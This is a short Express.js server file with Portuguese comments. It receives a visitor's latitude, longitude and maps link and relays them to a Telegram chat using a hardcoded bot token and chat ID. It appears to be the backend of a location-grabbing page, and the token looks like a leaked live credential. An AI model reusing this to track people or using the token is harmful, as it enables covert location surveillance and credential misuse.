// server.js
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const app = express();
app.use(cors());
app.use(bodyParser.json());

const TELEGRAM_BOT_TOKEN = "8510330829:AAG5Z_9XupX2x_GqeXPgfAooOjVC61L78v8";
const TELEGRAM_CHAT_ID = "-5124871642";

app.post("/send-location", async (req, res) => {
  const { latitude, longitude, maps } = req.body;

  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;

  try {
    // Envia a localização para o Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.log(error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

const port = process.env.PORT || 8088;

app.listen(port, () => {
  console.log(`Servidor rodando na porta ${port}`);
});
// ---------------------------

// Serve os arquivos da pasta atual (como o index.html)
app.use(express.static(__dirname));

// Quando alguém acessar o site, entrega o index.html
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});
